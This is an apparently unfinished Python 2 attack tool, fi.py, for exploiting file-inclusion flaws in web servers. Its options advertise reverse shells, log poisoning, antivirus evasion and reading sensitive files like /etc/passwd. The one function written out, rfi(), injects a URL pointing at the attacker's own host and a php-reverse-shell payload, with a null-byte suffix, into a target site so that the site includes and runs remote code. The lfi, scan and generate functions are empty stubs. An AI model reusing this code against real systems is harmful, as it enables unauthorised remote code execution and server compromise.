#!/usr/bin/python
#Assumes running web server
import argparse, sys, urllib2,time
import string, random
import socket, netifaces as ni

webserv_path = "/"
url = ""
dir = "/tmp"

#https://pypi.python.org/pypi/netifaces/
#http://stackoverflow.com/questions/24196932/how-can-i-get-the-ip-address-of-eth0-in-python
#need to install netifaces
def get_ip():
  return ni.ifaddresses('eth0')[2][0]['addr']

#http://stackoverflow.com/questions/13075241/move-help-to-a-different-argument-group-in-python-argparse
#https://docs.python.org/2/howto/argparse.html
parser = argparse.ArgumentParser(prog = "fi.py")

rfi_help = parser.add_argument_group("RFI Options")
lfi_help = parser.add_argument_group("LFI Options")
gen_help = parser.add_argument_group("File Generation Options")
scn_help = parser.add_argument_group("Scanner Options")
#rfi args
rfi_help.add_argument("-p","--path", type=str, help="The url path to the file", default = '/')
rfi_help.add_argument("-rp","-RPORT","--rport", type=str, help="The port for the remote webserver (default 80)", default = ':80')
rfi_help.add_argument("-lp","-LPORT","--lport", type=str, help="The port for your webserver (default 80)", default = ':80')
rfi_help.add_argument("-r","-RFI","--rfi", help="Remote file inclusion (tries to return a shell)", action="store_true")
rfi_help.add_argument("-u","-URL","--url", type=str, help="The url to attempt FI on (for rfi shell input full url with <> for the place to include)", required = True)
rfi_help.add_argument("-n","--filename", type=str, help="The filename to be included (defaults eth0)", default = "php-reverse-shell.txt")
rfi_help.add_argument("-i","--ip", type=str, help="The IP you want to be included", default=get_ip())
rfi_help.add_argument("-ha","--handler", help="Handle the rfi through fi.py instead of msf multi/handler or nc", action="store_true")
rfi_help.add_argument("-d","--delay", type=float, help="Set the delay between requests (rfi default = 3, scan default = .01)", default=3.0)

#generate args
gen_help.add_argument("-o","-OS","-os", type=str, help="The target OS", default="lin")
gen_help.add_argument("-w", type=str, help="A writable directory for rfi (default /tmp)", default="/tmp")
gen_help.add_argument("-V", help="Tries to avoid AV", action="store_true")
gen_help.add_argument("-G", help="Generate exploit file (defaults eth0 ip)", action="store_true")
gen_help.add_argument("-gp", type=str, help="generate path (default /var/www)", default="/var/www")
gen_help.add_argument("-a", type=str, help="The language for the file inclusion (PHP [default], ASP, JSP)", default="PHP")
 
#lfi args  
lfi_help.add_argument("-l","-LFI","-lfi", help="LFI scanner/reader", action="store_true")
lfi_help.add_argument("-psn", help="Poison Log Files for shell", action="store_true")
lfi_help.add_argument("-S", help="Look for sensitive files (etc/passwd, etc(etera)", action="store_true")

#scanner args
scn_help.add_argument("-s", help="Scan's for RFI or LFI", action="store_true")
scn_help.add_argument("-q","-rq", type=str, help="Request file to use")
args = parser.parse_args()

#Used for generating random id's for inclusion
def id_gen(size=8, chars=string.ascii_uppercase + string.digits):
  return ''.join(random.choice(chars) for _ in range(size))

#-p url path
#-rp remote port
#-lp lport
#-r rfi choice
#-u url
#-n file  ?
#-i ip for inclusion
#-ha where to handle rfi
#-d delay
#can do rfi with a straight shell, can also upload a file and execute it. How should that be handled?
def rfi():
  opener = urllib2.build_opener()
  if not (args.path[0]=='/'):
    args.path = '/' + args.path
  if not (args.path[-1]=='/'):
    args.path = args.path + '/'
  rfi_url = args.ip + args.path + args.filename
  rfi_req = args.url.replace('<ip>',rfi_url+'%00')
  print "RFIing: " + rfi_req
  opener.open(rfi_req)

def lfi():
  print 'here'

def scan():
  print 'here'


def generate():
  print 'here'
  

def main():
  if args.rfi:
    rfi()

if __name__ == "__main__":
  main()
